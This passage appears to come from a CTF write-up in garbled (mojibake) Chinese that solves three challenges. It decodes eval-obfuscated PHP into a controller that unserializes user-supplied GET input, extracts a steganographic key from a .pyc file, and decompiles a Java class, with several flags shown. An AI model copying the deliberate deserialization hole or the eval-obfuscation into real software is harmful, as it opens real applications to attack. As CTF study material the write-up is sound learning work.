class="string">&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•æ‰‹åŠ¨é€å±‚è§£å¯†ï¼Œæœ€åå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">C4zyC0m3On</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Ez-Steg"><a href="#Ez-Steg" class="headerlink" title="Ez_Steg"></a>Ez_Steg</h3><p>zipå‹ç¼©åŒ…æ ¹æ®æç¤ºçˆ†ç ´6ä½æ•°å­—å¯†ç ä¸º <code>220101</code>ï¼Œè§£å‹æœ‰ <code>steg.pyc</code> å’Œ <code>flag.txt</code>ã€‚</p><p>ç”¨uncompyle6é€†pycå‘ç°æ— æœ‰æ„ä¹‰ä»£ç ï¼Œä¸ºpycéšå†™ï¼Œç”¨stegosauruså·¥å…·è§£å¯†ï¼š</p><p><code>python stegosaurus.py steg.pyc -x</code></p><p>å¾—åˆ°å¯†ç  <code>Extracted payload: TheKey:St3g1sV3ryFuNny</code>ã€‚</p><p>å†å°† <code>flag.txt</code> ä¸­emojiå¯†æ–‡ç”¨emoji-aesè§£å¾—åˆ°flagï¼š<code>cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</code></p><p>â€‹    </p><h3 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h3><blockquote><p>äºŒè¿›åˆ¶</p></blockquote><p>æ–‡ä»¶å¤´ <code>CAFEBABE</code> è¯´æ˜ä¸º <code>.class</code> Javaå­—èŠ‚ç æ–‡ä»¶ï¼Œç”¨jadxæŸ¥çœ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Main  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] strArr)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bArr = &#123;<span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">70</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">86</span>, <span class="number">120</span>, <span class="number">117</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">65</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, <span class="number">119</span>, <span class="number">77</span>, <span class="number">84</span>, <span class="number">69</span>, 